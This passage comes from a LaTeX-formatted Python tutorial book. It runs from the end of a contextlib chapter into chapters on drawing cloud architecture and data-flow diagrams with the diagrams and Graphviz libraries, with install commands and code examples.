    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Time taken: }\SpecialCharTok{\{}\NormalTok{end }\OperatorTok{{-}}\NormalTok{ start}\SpecialCharTok{\}}\SpecialStringTok{ seconds\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{with}\NormalTok{ timer():}
    \BuiltInTok{sum}\NormalTok{([i }\OperatorTok{**} \DecValTok{2} \ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{10000}\NormalTok{)])}
\end{Highlighting}
\end{Shaded}

\section{Best Practices}\label{best-practices-5}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use \texttt{contextmanager} for Simple Context Managers}: Use
  the \texttt{contextmanager} decorator to create simple context
  managers using generator functions.
\item
  \textbf{Use \texttt{ExitStack} for Complex Context Managers}: Use the
  \texttt{ExitStack} class for managing multiple context managers
  dynamically.
\item
  \textbf{Ensure Proper Cleanup}: Always ensure that resources are
  properly cleaned up by using \texttt{try}/\texttt{finally} blocks or
  context managers.
\item
  \textbf{Suppress Exceptions Sparingly}: Use the \texttt{suppress}
  function sparingly and only when you are sure that ignoring the
  exception is safe.
\end{enumerate}

\section{Conclusion}\label{conclusion-37}

The \texttt{contextlib} module in Python provides a suite of tools for
working with context managers, making it easier to manage resources and
ensure proper cleanup. By using \texttt{contextlib.contextmanager},
\texttt{closing}, \texttt{suppress}, \texttt{redirect\_stdout},
\texttt{redirect\_stderr}, and \texttt{ExitStack}, you can write more
robust and maintainable code. Understanding and utilizing these tools
will help you handle resource management tasks efficiently and
effectively in your Python programs.

\bookmarksetup{startatroot}

\chapter{Introduction to Python Libraries for System
Design}\label{introduction-to-python-libraries-for-system-design}

System design involves creating architectural diagrams and generating
documentation to illustrate the components and interactions within a
system. Python offers several libraries to facilitate these tasks
programmatically. This tutorial will cover using the \texttt{diagrams}
library for creating architectural diagrams and \texttt{Graphviz} for
generating graph-based diagrams like data flow diagrams.

\subsection{\texorpdfstring{Creating Architectural Diagrams with
\texttt{diagrams}}{Creating Architectural Diagrams with diagrams}}\label{creating-architectural-diagrams-with-diagrams}

The \texttt{diagrams} library allows you to create system architecture
diagrams programmatically. It provides a simple and intuitive way to
visualize cloud infrastructure, data flows, and other components.

\subsubsection{\texorpdfstring{Installing
\texttt{diagrams}}{Installing diagrams}}\label{installing-diagrams}

First, you need to install the \texttt{diagrams} library. You can
install it using pip:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install diagrams}
\end{Highlighting}
\end{Shaded}

\subsubsection{\texorpdfstring{Basic Usage of
\texttt{diagrams}}{Basic Usage of diagrams}}\label{basic-usage-of-diagrams}

You can create diagrams by defining nodes and edges within a context
block.

\paragraph{Example: Creating a Simple Architecture
Diagram}\label{example-creating-a-simple-architecture-diagram}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}

\CommentTok{\# Define the diagram}
\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Simple Architecture"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{):}
\NormalTok{    load\_balancer }\OperatorTok{=}\NormalTok{ ELB(}\StringTok{"Load Balancer"}\NormalTok{)}
\NormalTok{    web\_server }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Web Server"}\NormalTok{)}
\NormalTok{    database }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"Database"}\NormalTok{)}

\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web\_server }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ database}
\end{Highlighting}
\end{Shaded}

The above code creates a simple architecture diagram showing an ELB
(Elastic Load Balancer) connected to an EC2 instance, which in turn is
connected to an RDS (Relational Database Service) instance.

\subsubsection{Customizing Diagrams}\label{customizing-diagrams}

You can customize the appearance and structure of your diagrams by
setting various parameters.

\paragraph{Example: Customizing Diagram
Attributes}\label{example-customizing-diagram-attributes}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram, Cluster}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}

\CommentTok{\# Define the diagram}
\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Grouped Architecture"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{, direction}\OperatorTok{=}\StringTok{"TB"}\NormalTok{):}
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Web Tier"}\NormalTok{):}
\NormalTok{        web\_server1 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Web Server 1"}\NormalTok{)}
\NormalTok{        web\_server2 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Web Server 2"}\NormalTok{)}

    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Database Cluster"}\NormalTok{):}
\NormalTok{        primary\_db }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"Primary DB"}\NormalTok{)}
\NormalTok{        replica\_db }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"Replica DB"}\NormalTok{)}

\NormalTok{    load\_balancer }\OperatorTok{=}\NormalTok{ ELB(}\StringTok{"Load Balancer"}\NormalTok{)}
\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web\_server1}
\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web\_server2}
\NormalTok{    web\_server1 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ primary\_db}
\NormalTok{    web\_server2 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ replica\_db}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Generating Graph-Based Diagrams with
\texttt{Graphviz}}{Generating Graph-Based Diagrams with Graphviz}}\label{generating-graph-based-diagrams-with-graphviz}

\texttt{Graphviz} is a powerful tool for creating graph-based diagrams
such as data flow diagrams, dependency graphs, and more.

\subsubsection{\texorpdfstring{Installing
\texttt{Graphviz}}{Installing Graphviz}}\label{installing-graphviz}

You need to install both the \texttt{graphviz} library and the Graphviz
system package. You can install the Python library using pip:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install graphviz}
\end{Highlighting}
\end{Shaded}

You also need to install Graphviz system package. For example, on
Ubuntu:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt{-}get install graphviz}
\end{Highlighting}
\end{Shaded}

On macOS using Homebrew:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{brew}\NormalTok{ install graphviz}
\end{Highlighting}
\end{Shaded}

\subsubsection{\texorpdfstring{Basic Usage of
\texttt{Graphviz}}{Basic Usage of Graphviz}}\label{basic-usage-of-graphviz}

You can create graphs by defining nodes and edges using the
\texttt{graphviz} library.

\paragraph{Example: Creating a Simple
Graph}\label{example-creating-a-simple-graph}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ graphviz }\ImportTok{import}\NormalTok{ Digraph}

\CommentTok{\# Create a new directed graph}
\NormalTok{dot }\OperatorTok{=}\NormalTok{ Digraph(comment}\OperatorTok{=}\StringTok{"Simple Graph"}\NormalTok{)}

\CommentTok{\# Add nodes}
\NormalTok{dot.node(}\StringTok{"A"}\NormalTok{, }\StringTok{"Node A"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"B"}\NormalTok{, }\StringTok{"Node B"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"C"}\NormalTok{, }\StringTok{"Node C"}\NormalTok{)}

\CommentTok{\# Add edges}
\NormalTok{dot.edges([}\StringTok{"AB"}\NormalTok{, }\StringTok{"BC"}\NormalTok{, }\StringTok{"CA"}\NormalTok{])}

\CommentTok{\# Render the graph}
\NormalTok{dot.render(}\StringTok{"simple\_graph"}\NormalTok{, }\BuiltInTok{format}\OperatorTok{=}\StringTok{"png"}\NormalTok{, view}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

This code creates a simple directed graph with three nodes and edges
between them.

\subsubsection{Customizing Graphs}\label{customizing-graphs}

You can customize nodes and edges with different shapes, colors, and
styles.

\paragraph{Example: Customizing Nodes and
Edges}\label{example-customizing-nodes-and-edges}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ graphviz }\ImportTok{import}\NormalTok{ Digraph}

\CommentTok{\# Create a new directed graph}
\NormalTok{dot }\OperatorTok{=}\NormalTok{ Digraph(comment}\OperatorTok{=}\StringTok{"Customized Graph"}\NormalTok{)}

\CommentTok{\# Add customized nodes}
\NormalTok{dot.node(}\StringTok{"A"}\NormalTok{, }\StringTok{"Node A"}\NormalTok{, shape}\OperatorTok{=}\StringTok{"box"}\NormalTok{, color}\OperatorTok{=}\StringTok{"blue"}\NormalTok{, style}\OperatorTok{=}\StringTok{"filled"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"B"}\NormalTok{, }\StringTok{"Node B"}\NormalTok{, shape}\OperatorTok{=}\StringTok{"ellipse"}\NormalTok{, color}\OperatorTok{=}\StringTok{"green"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"C"}\NormalTok{, }\StringTok{"Node C"}\NormalTok{, shape}\OperatorTok{=}\StringTok{"diamond"}\NormalTok{, color}\OperatorTok{=}\StringTok{"red"}\NormalTok{, style}\OperatorTok{=}\StringTok{"filled"}\NormalTok{)}

\CommentTok{\# Add customized edges}
\NormalTok{dot.edge(}\StringTok{"A"}\NormalTok{, }\StringTok{"B"}\NormalTok{, label}\OperatorTok{=}\StringTok{"A to B"}\NormalTok{, color}\OperatorTok{=}\StringTok{"black"}\NormalTok{)}
\NormalTok{dot.edge(}\StringTok{"B"}\NormalTok{, }\StringTok{"C"}\NormalTok{, label}\OperatorTok{=}\StringTok{"B to C"}\NormalTok{, color}\OperatorTok{=}\StringTok{"gray"}\NormalTok{)}
\NormalTok{dot.edge(}\StringTok{"C"}\NormalTok{, }\StringTok{"A"}\NormalTok{, label}\OperatorTok{=}\StringTok{"C to A"}\NormalTok{, color}\OperatorTok{=}\StringTok{"orange"}\NormalTok{)}

\CommentTok{\# Render the graph}
\NormalTok{dot.render(}\StringTok{"customized\_graph"}\NormalTok{, }\BuiltInTok{format}\OperatorTok{=}\StringTok{"png"}\NormalTok{, view}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Example: Combining \texttt{diagrams} and
\texttt{Graphviz} for System
Design}{Example: Combining diagrams and Graphviz for System Design}}\label{example-combining-diagrams-and-graphviz-for-system-design}

Let's create a more complex system design example by combining both
\texttt{diagrams} and \texttt{Graphviz}.

\paragraph{\texorpdfstring{Example: Visualizing a Multi-Tier Application
with \texttt{diagrams} and
\texttt{Graphviz}}{Example: Visualizing a Multi-Tier Application with diagrams and Graphviz}}\label{example-visualizing-a-multi-tier-application-with-diagrams-and-graphviz}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram, Cluster}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}
\ImportTok{from}\NormalTok{ diagrams.onprem.client }\ImportTok{import}\NormalTok{ User}
\ImportTok{from}\NormalTok{ graphviz }\ImportTok{import}\NormalTok{ Digraph}

\CommentTok{\# Define the architecture diagram using \textasciigrave{}diagrams\textasciigrave{}}
\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Multi{-}Tier Application"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{, direction}\OperatorTok{=}\StringTok{"TB"}\NormalTok{):}
\NormalTok{    user }\OperatorTok{=}\NormalTok{ User(}\StringTok{"User"}\NormalTok{)}
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Web Tier"}\NormalTok{):}
\NormalTok{        web\_server1 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Web Server 1"}\NormalTok{)}
\NormalTok{        web\_server2 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Web Server 2"}\NormalTok{)}

    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Application Tier"}\NormalTok{):}
\NormalTok{        app\_server }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"App Server"}\NormalTok{)}

    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Database Cluster"}\NormalTok{):}
\NormalTok{        primary\_db }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"Primary DB"}\NormalTok{)}
\NormalTok{        replica\_db }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"Replica DB"}\NormalTok{)}

\NormalTok{    user }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ ELB(}\StringTok{"Load Balancer"}\NormalTok{) }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ [web\_server1, web\_server2] }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ app\_server }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ primary\_db}
\NormalTok{    app\_server }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ replica\_db}

\CommentTok{\# Define the data flow diagram using \textasciigrave{}Graphviz\textasciigrave{}}
\NormalTok{dot }\OperatorTok{=}\NormalTok{ Digraph(comment}\OperatorTok{=}\StringTok{"Data Flow Diagram"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"A"}\NormalTok{, }\StringTok{"User"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"B"}\NormalTok{, }\StringTok{"Load Balancer"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"C"}\NormalTok{, }\StringTok{"Web Server 1"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"D"}\NormalTok{, }\StringTok{"Web Server 2"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"E"}\NormalTok{, }\StringTok{"App Server"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"F"}\NormalTok{, }\StringTok{"Primary DB"}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{"G"}\NormalTok{, }\StringTok{"Replica DB"}\NormalTok{)}

\NormalTok{dot.edges([}\StringTok{"AB"}\NormalTok{, }\StringTok{"BC"}\NormalTok{, }\StringTok{"BD"}\NormalTok{, }\StringTok{"CE"}\NormalTok{, }\StringTok{"DE"}\NormalTok{, }\StringTok{"EF"}\NormalTok{, }\StringTok{"EG"}\NormalTok{])}

\CommentTok{\# Render the data flow diagram}
\NormalTok{dot.render(}\StringTok{"data\_flow\_diagram"}\NormalTok{, }\BuiltInTok{format}\OperatorTok{=}\StringTok{"png"}\NormalTok{, view}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-38}

Python libraries like \texttt{diagrams} and \texttt{Graphviz} provide
powerful tools for creating architectural diagrams and graph-based
visualizations programmatically. By mastering these libraries, you can
enhance your system design tasks, making it easier to visualize,
document, and communicate complex architectures and data flows.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{diagrams} Python
Module}{Deep Dive into the diagrams Python Module}}\label{deep-dive-into-the-diagrams-python-module}

The \texttt{diagrams} module in Python is a powerful tool for creating
cloud system architecture diagrams and other diagrams related to
infrastructure and operations. It provides a high-level interface for
creating diagrams using a simple and intuitive syntax. The module
supports various cloud providers, including AWS, Azure, Google Cloud,
and others, as well as general system components.

\section{Table of Contents}\label{table-of-contents-14}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-diagrams]{Introduction to \texttt{diagrams}}
\item
  \hyperref[installation]{Installation}
\item
  \hyperref[basic-usage]{Basic Usage}
\item
  \hyperref[creating-nodes]{Creating Nodes}
\item
  \hyperref[connecting-nodes]{Connecting Nodes}
\item
  \hyperref[grouping-nodes]{Grouping Nodes}
\item
  \hyperref[customizing-diagrams]{Customizing Diagrams}
\item
  \hyperref[supported-providers-and-services]{Supported Providers and
  Services}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{\texorpdfstring{Introduction to
\texttt{diagrams}}{Introduction to diagrams}}\label{introduction-to-diagrams}

The \texttt{diagrams} module simplifies the process of creating visual
representations of cloud architectures, network layouts, and other
system configurations. It uses a graph description language called
\texttt{Graphviz} under the hood to render the diagrams.

\section{Installation}\label{installation-1}

To install the \texttt{diagrams} module, you need to have Python
installed on your system. You can then install it using \texttt{pip}:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install diagrams}
\end{Highlighting}
\end{Shaded}

Additionally, you need to have \texttt{Graphviz} installed. Depending on
your operating system, you can install it using the following commands:

\begin{itemize}
\item
  \textbf{For Ubuntu/Debian:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt{-}get install graphviz}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{For macOS:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{brew}\NormalTok{ install graphviz}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{For Windows:}

  Download and install Graphviz from
  \href{https://graphviz.gitlab.io/download/}{here}.
\end{itemize}

\section{Basic Usage}\label{basic-usage-4}

Creating a simple diagram with \texttt{diagrams} is straightforward.
Here's a basic example that demonstrates how to create a simple
architecture diagram:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}

\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Simple Diagram"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{):}
\NormalTok{    ELB(}\StringTok{"load balancer"}\NormalTok{) }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ EC2(}\StringTok{"web server"}\NormalTok{) }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ RDS(}\StringTok{"database"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

This code snippet creates a simple diagram with a load balancer
connected to a web server, which in turn is connected to a database. The
\texttt{show=False} parameter is used to prevent the diagram from
opening automatically after being generated.

\section{Creating Nodes}\label{creating-nodes}

Nodes represent different components in the diagram. Each node
corresponds to a specific service or component from a cloud provider or
a generic category. Nodes can be created by importing the appropriate
classes from the \texttt{diagrams} module.

\subsection{Example}\label{example-36}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}

\CommentTok{\# Creating nodes}
\NormalTok{load\_balancer }\OperatorTok{=}\NormalTok{ ELB(}\StringTok{"load balancer"}\NormalTok{)}
\NormalTok{web\_server }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web server"}\NormalTok{)}
\NormalTok{database }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"database"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Connecting Nodes}\label{connecting-nodes}

Nodes can be connected using the \texttt{\textgreater{}\textgreater{}}
operator, which denotes a directional connection between components.

\subsection{Example}\label{example-37}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}

\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Web Service"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{):}
\NormalTok{    ELB(}\StringTok{"load balancer"}\NormalTok{) }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ EC2(}\StringTok{"web server"}\NormalTok{) }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ RDS(}\StringTok{"database"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

This creates a diagram where the load balancer is connected to the web
server, which is connected to the database.

\section{Grouping Nodes}\label{grouping-nodes}

Nodes can be grouped using clusters, which are used to visually organize
nodes into logical groups.

\subsection{Example}\label{example-38}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Cluster, Diagram}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}

\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Grouped Diagram"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{):}
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Web Cluster"}\NormalTok{):}
\NormalTok{        web1 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web1"}\NormalTok{)}
\NormalTok{        web2 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web2"}\NormalTok{)}
\NormalTok{        web3 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web3"}\NormalTok{)}
        
\NormalTok{    load\_balancer }\OperatorTok{=}\NormalTok{ ELB(}\StringTok{"load balancer"}\NormalTok{)}
\NormalTok{    database }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"database"}\NormalTok{)}

\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web1}
\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web2}
\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web3}
\NormalTok{    web1 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ database}
\NormalTok{    web2 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ database}
\NormalTok{    web3 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ database}
\end{Highlighting}
\end{Shaded}

In this example, the web servers are grouped into a cluster called ``Web
Cluster''.

\section{Customizing Diagrams}\label{customizing-diagrams-1}

Diagrams can be customized by setting various attributes, such as the
output format, the direction of the graph, and other styling options.

\subsection{Example}\label{example-39}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram, Cluster}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}

\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Custom Diagram"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{, direction}\OperatorTok{=}\StringTok{"TB"}\NormalTok{):}
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Web Cluster"}\NormalTok{):}
\NormalTok{        web1 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web1"}\NormalTok{)}
\NormalTok{        web2 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web2"}\NormalTok{)}
\NormalTok{        web3 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web3"}\NormalTok{)}
        
\NormalTok{    load\_balancer }\OperatorTok{=}\NormalTok{ ELB(}\StringTok{"load balancer"}\NormalTok{)}
\NormalTok{    database }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"database"}\NormalTok{)}

\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web1}
\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web2}
\NormalTok{    load\_balancer }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ web3}
\NormalTok{    web1 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ database}
\NormalTok{    web2 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ database}
\NormalTok{    web3 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ database}
\end{Highlighting}
\end{Shaded}

In this example, the direction of the graph is set to top-to-bottom
(\texttt{"TB"}).

\section{Supported Providers and
Services}\label{supported-providers-and-services}

The \texttt{diagrams} module supports various cloud providers and
generic components. Each provider has its own set of services and
components that can be used to create diagrams.

\subsection{AWS}\label{aws}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}
\end{Highlighting}
\end{Shaded}

\subsection{Azure}\label{azure}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams.azure.compute }\ImportTok{import}\NormalTok{ VM}
\ImportTok{from}\NormalTok{ diagrams.azure.database }\ImportTok{import}\NormalTok{ SQLDatabase}
\ImportTok{from}\NormalTok{ diagrams.azure.network }\ImportTok{import}\NormalTok{ LoadBalancer}
\end{Highlighting}
\end{Shaded}

\subsection{GCP}\label{gcp}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams.gcp.compute }\ImportTok{import}\NormalTok{ GCE}
\ImportTok{from}\NormalTok{ diagrams.gcp.database }\ImportTok{import}\NormalTok{ SQL}
\ImportTok{from}\NormalTok{ diagrams.gcp.network }\ImportTok{import}\NormalTok{ LoadBalancing}
\end{Highlighting}
\end{Shaded}

\subsection{Generic}\label{generic}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams.generic.compute }\ImportTok{import}\NormalTok{ Server}
\ImportTok{from}\NormalTok{ diagrams.generic.database }\ImportTok{import}\NormalTok{ SQL}
\ImportTok{from}\NormalTok{ diagrams.generic.network }\ImportTok{import}\NormalTok{ Firewall}
\end{Highlighting}
\end{Shaded}

For a full list of supported providers and services, refer to the
\href{https://diagrams.mingrammer.com/docs/nodes}{official
documentation}.

\section{Practical Examples}\label{practical-examples-7}

\subsection{Example 1: Multi-Cloud
Architecture}\label{example-1-multi-cloud-architecture}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram, Cluster}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.azure.compute }\ImportTok{import}\NormalTok{ VM}
\ImportTok{from}\NormalTok{ diagrams.gcp.compute }\ImportTok{import}\NormalTok{ GCE}
\ImportTok{from}\NormalTok{ diagrams.onprem.network }\ImportTok{import}\NormalTok{ Internet}

\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Multi{-}Cloud Architecture"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{):}
\NormalTok{    internet }\OperatorTok{=}\NormalTok{ Internet(}\StringTok{"Internet"}\NormalTok{)}
    
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"AWS"}\NormalTok{):}
\NormalTok{        aws\_web }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"web server"}\NormalTok{)}
        
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Azure"}\NormalTok{):}
\NormalTok{        azure\_web }\OperatorTok{=}\NormalTok{ VM(}\StringTok{"web server"}\NormalTok{)}
        
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"GCP"}\NormalTok{):}
\NormalTok{        gcp\_web }\OperatorTok{=}\NormalTok{ GCE(}\StringTok{"web server"}\NormalTok{)}
        
\NormalTok{    internet }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ aws\_web}
\NormalTok{    internet }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ azure\_web}
\NormalTok{    internet }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ gcp\_web}
\end{Highlighting}
\end{Shaded}

